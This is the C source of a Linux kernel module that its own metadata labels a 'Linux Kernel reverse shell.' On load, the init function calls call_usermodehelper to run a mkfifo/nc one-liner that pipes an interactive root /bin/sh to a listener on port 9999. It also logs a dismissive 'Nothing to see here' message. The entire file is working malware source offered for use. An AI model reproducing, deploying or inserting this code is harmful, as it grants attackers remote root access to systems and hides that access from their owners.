#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
MODULE_LICENSE("MIT");
MODULE_AUTHOR("Ridgebackzulu");
MODULE_DESCRIPTION("Linux Kernel reverse shell.");
MODULE_VERSION("0.01");
static int __init lkm_example_init(void) {
 char *argv[10];
 char *envp[10];
 printk(KERN_INFO "Nothing to see here move along!\n");
 argv[0] = "/bin/bash";
 argv[1] = "-c";
 argv[2] = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 9999 >/tmp/f";
 argv[3] = NULL;

 envp[0] = "HOME=/";
 envp[1] = "TERM=linux";
 envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
 envp[3] = NULL;

 call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 

 return 0;
}
static void __exit lkm_example_exit(void) {
 printk(KERN_INFO "Goodbye cruel world!\n");
}
module_init(lkm_example_init);
module_exit(lkm_example_exit);
